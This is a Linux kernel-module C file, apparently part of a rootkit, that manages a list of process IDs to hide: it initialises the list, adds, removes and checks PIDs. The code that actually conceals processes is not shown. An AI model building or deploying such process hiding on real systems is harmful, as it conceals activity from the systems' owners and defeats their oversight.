#include <linux/slab.h>

#include "hidepid.h"
#include "list.h"
#include "log.h"

// TODO: Using a List_t just to store pid_t types means a lot of overhead
// but as a first approach is ok.
List_t *__hidden_pid_list = NULL;

static void __print_pid(pid_t *param) {
    if (param == NULL) {
        yarr_log("param is NULL");
        return;
    }

    yarr_log("pid: %d", *param);
    return;
}

// TODO: We are returning -1 on errors, -1 also means p1 < p2.
static int __cmp_pid(pid_t *p1, pid_t *p2) {
    if (p1 == NULL || p2 == NULL) {
        yarr_log("p1 or p2 are NULL");
        return -1;
    }

    if (*p1 < *p2) {
        return -1;
    } else if (*p1 > *p2) {
        return 1;
    } else {
        return 0;
    }
}

// We need such function as we allocate memory for pid_t for each element in
// the list.
static void __pid_t_free(pid_t *pid_ptr) {
    if (pid_ptr != NULL) {
        kfree(pid_ptr);
    }

    return;
}

static inline int __hidepid_initialized(void) {
    return (__hidden_pid_list == NULL)? 0: 1;
}

int init_hidepid(void) {
    if (__hidepid_initialized()) {
        yarr_log("Double initialization detected");
        return 0;
    }

    __hidden_pid_list = List_create(
            (void *)__print_pid,
            (void *)__cmp_pid,
            (void *)__pid_t_free);
    if (__hidden_pid_list == NULL) {
        yarr_log("Couldn't create __hidden_pid_list");
        return -1;
    }

    return 0;
}

int stop_hidepid(void) {
    if (__hidepid_initialized()) {
        List_destroy(__hidden_pid_list);
        __hidden_pid_list = NULL;
    }

    return 0;
}

int hide_pid(pid_t pid) {
    pid_t *pid_data;
    int err;

    if (!__hidepid_initialized()) {
        yarr_log("Hidepid subsystem not initialized");
        return -1;
    }

    if (pid_is_hidden(pid)) {
        return 0;
    }

    pid_data = kmalloc(sizeof(pid_t), GFP_KERNEL);
    if (pid_data == NULL) {
        yarr_log("Couldn't allocate memory for pid");
        return -1;
    }

    *pid_data = pid;
    err = List_insertData(__hidden_pid_list, pid_data);
    return err;
}

int stop_hide_pid(pid_t pid) {
    ListItem_t *item;
    int err;

    if (!__hidepid_initialized()) {
        yarr_log("Hidepid subsystem not initialize");
        return -1;
    }

    item = List_getItemByData(__hidden_pid_list, &pid);
    if (item != NULL) {
        err = List_removeItem(__hidden_pid_list, item);
        if (err) {
            yarr_log("Pid present but List_removeItem() returned error");
            return -1;
        }

        ListItem_destroy(item, __hidden_pid_list->free_data);
    }

    return 0;
}

int pid_is_hidden(pid_t pid) {
    if (!__hidepid_initialized()) {
        return 0;
    }

    return List_itemIsContained(__hidden_pid_list, &pid);
}

